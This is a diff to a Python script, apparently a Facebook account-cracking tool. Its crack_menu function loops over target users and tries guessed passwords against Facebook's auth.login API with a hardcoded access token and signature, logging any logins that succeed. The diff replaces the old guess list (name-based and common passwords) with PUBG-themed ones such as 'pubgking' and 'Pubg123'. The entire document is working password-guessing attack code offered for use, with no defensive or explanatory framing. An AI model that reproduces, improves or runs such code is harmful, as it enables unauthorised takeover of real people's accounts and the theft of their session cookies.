@@ -273,7 +273,7 @@ def crack_menu():
 					crt.close()
 					checkpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = 'pubgqueen'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
@@ -287,7 +287,7 @@ def crack_menu():
 							crt.close()
 							checkpoint.append(user+pass2)
 						else:
-							pass3 = '000786'
+							pass3 = 'pubgking'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
@@ -301,7 +301,7 @@ def crack_menu():
 									crt.close()
 									checkpoint.append(user+pass3)
 								else:
-									pass4 = b['first_name'] + '123'
+									pass4 = 'Pubg123'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
@@ -315,7 +315,7 @@ def crack_menu():
 											crt.close()
 											checkpoint.append(user+pass4)
 										else:
-											pass5 = b['first_name'] + '12345'
+											pass5 = 'Pubgking'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if "access_token" in q:
@@ -329,7 +329,7 @@ def crack_menu():
 													crt.close()
 													checkpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '1122'
+													pass6 = 'Pubgqueen'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if "access_token" in q:
@@ -343,7 +343,7 @@ def crack_menu():
 															crt.close()
 															checkpoint.append(user+pass6)
 														else:
-															pass7 = b['first_name'] + '786'
+															pass7 = 'Pubg786'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
